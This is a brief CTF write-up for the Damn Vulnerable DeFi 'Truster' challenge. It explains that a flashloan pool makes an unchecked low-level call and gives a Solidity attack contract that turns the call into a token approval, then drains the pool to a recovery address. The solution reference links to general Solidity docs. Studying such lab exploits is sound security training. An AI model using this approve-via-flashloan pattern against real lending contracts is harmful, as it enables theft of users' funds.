# Truster CTF Writeup

## Challenge Description
More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.



## The Exploit Strategy
There is a contract called TrusterLender.sol. in TrusterLender.sol there is a vuln in function ,the function callinng low level call on target address 

The attack strategy revolves around getting approval on maximum number of tokens of DVT token after flashlon we can transfer to recovery address.

1. create flashloan for zero ammount and exploitable low level data
2. after getting flasloan transfer to recovey address



## Solution
```solidity
contract Attack {
    address recovery;
    TrusterLenderPool public pool;

    constructor(TrusterLenderPool _challenge, address _recovery) {
        pool = _challenge;
        recovery = _recovery;
    }

    function attack() public {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 1_000_000e18);
        pool.flashLoan(0, address(this), address(pool.token()), data);
        pool.token().transferFrom(address(pool), recovery, 1_000_000e18);
    }
}
```

## References
- [Solution Link](https://docs.soliditylang.org/)
- [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/)
